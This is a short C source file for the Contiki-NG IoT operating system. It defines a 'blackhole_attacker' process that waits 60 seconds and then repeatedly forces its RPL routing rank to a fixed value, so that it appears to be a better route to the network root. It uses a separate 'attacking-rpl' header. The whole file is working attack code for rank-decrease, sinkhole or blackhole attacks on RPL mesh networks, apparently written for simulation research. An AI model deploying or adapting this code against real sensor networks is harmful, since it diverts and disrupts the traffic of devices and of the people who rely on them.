#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include <stdint.h>
#include <inttypes.h>
#include "attacking-rpl/rpl.h"
#include "net/packetbuf.h"
#include "net/ipv6/uipbuf.h"
#include "net/ipv6/uip.h"
#include "net/ipv6/uip-icmp6.h"

#include "sys/log.h"
#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO

#define WITH_SERVER_REPLY  1

/*---------------------------------------------------------------------------*/
PROCESS(blackhole_attacker, "Decreased rank attacker");
AUTOSTART_PROCESSES(&blackhole_attacker);

/*---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(blackhole_attacker, ev, data)
{
  static struct etimer periodic_timer;
  static uip_ipaddr_t root_ipaddr;

  PROCESS_BEGIN();
  LOG_INFO("Attacker will be inactive for 60 seconds.\n");
  NETSTACK_RADIO.off();
  etimer_set(&periodic_timer, 60 * CLOCK_SECOND);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
  NETSTACK_RADIO.on();
  LOG_INFO("Attacker is now active.\n");

  while (1) {
    if (NETSTACK_ROUTING.get_root_ipaddr(&root_ipaddr)) {
      curr_instance.dag.rank = RPL_FORCED_RANK;
      LOG_INFO("Current node rank: %u\n", curr_instance.dag.rank);
    }
    etimer_set(&periodic_timer, 5 * CLOCK_SECOND);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
    etimer_reset(&periodic_timer);
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
